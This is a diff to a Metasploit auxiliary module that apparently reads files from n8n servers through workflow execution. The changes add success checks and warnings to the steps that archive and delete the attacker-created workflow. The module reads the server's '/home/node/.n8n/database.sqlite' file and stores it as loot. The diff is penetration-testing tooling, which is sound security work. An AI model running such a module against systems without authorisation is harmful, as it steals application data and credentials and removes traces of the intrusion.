@@ -217,18 +217,34 @@ class MetasploitModule < Msf::Auxiliary
   def archive_workflow
     print_status("Cleaning up workflow #{@workflow_id}...")
 
-    send_request_cgi(
+    res = send_request_cgi(
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'archive'),
       'keep_cookies' => true
     )
+
+    return false unless res&.code == 200
+
+    json_data = res.get_json_document
+
+    return false unless json_data.dig('data', 'id') == @workflow_id
+
+    true
   end
 
   def delete_workflow
-    send_request_cgi(
+    res = send_request_cgi(
       'method' => 'DELETE',
       'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)
     )
+
+    return false unless res&.code == 200
+
+    json_data = res.get_json_document
+
+    return false unless json_data['data'] == true
+
+    true
   end
 
   def extract_content(run_id)
@@ -265,9 +281,15 @@ class MetasploitModule < Msf::Auxiliary
 
     file_content = extract_content(run_id)
 
-    archive_workflow
+    if !archive_workflow
+      print_warning('Could not archive workflow, workflow might need to be archived and deleted manually')
+      return file_content
+    end
 
-    delete_workflow
+    if !delete_workflow
+      print_warning('Could not deleted workflow, workflow might need to be deleted manually')
+      return file_content
+    end
 
     file_content
   end
@@ -292,8 +314,6 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::BadConfig, '') if target_username.blank?
 
       db_content = read_file('/home/node/.n8n/database.sqlite')
-
-      print_good("Database saved to: #{stored_path}")
 
       db_loot_name = store_loot('database.sqlite', 'application/x-sqlite3', datastore['rhosts'], db_content)
 
